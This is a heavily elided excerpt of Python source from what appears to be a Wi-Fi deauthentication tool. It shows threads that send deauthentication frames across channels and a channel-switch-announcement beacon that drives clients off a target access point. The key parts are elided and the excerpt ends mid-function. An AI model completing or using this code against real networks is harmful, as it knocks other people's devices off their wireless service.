...
class Deauther:
    ...
    def start(self):
        ...
        if self.attack_type == "csa_attack":
            ...
            for i in range(len(five_ghz_channels)):
                ...
                if i_channel not in channels:
                    new_channel = i_channel
                    break

            csa_beacon_frame = [self._generate_csa_beacon_frame(self.target, target_ap['ssid'], new_channel)]
            th = threading.Thread(target=self._deauth_interface_thread,
                                  args=(self.interfaces[0], csa_beacon_frame, [target_ap['channel']]))
            th.daemon = True
            ...
            # Equally distribute the channels to hop among the interfaces
            ...
            for i, interface in enumerate(self.interfaces):
                ...
                if interface_channels:
                    ...
                    th = threading.Thread(target=self._deauth_interface_thread,
                                          args=(interface, frames_to_send, channels_to_send))
                    th.daemon = True
    ...
    def _deauth_interface_thread(self, interface, frames, channels):
        ...
        while not self.stop_event.is_set():
            for i, frame in enumerate(frames):
                ...
                logger.debug("Sending deauth on channel " + str(
                    channels[i]) + " on interface " + interface + " from " + frame.addr1 + " to:" + frame.addr2)
    ...
    @staticmethod
    def _format_mac_address(macaddr):
        if len(macaddr) != 12:
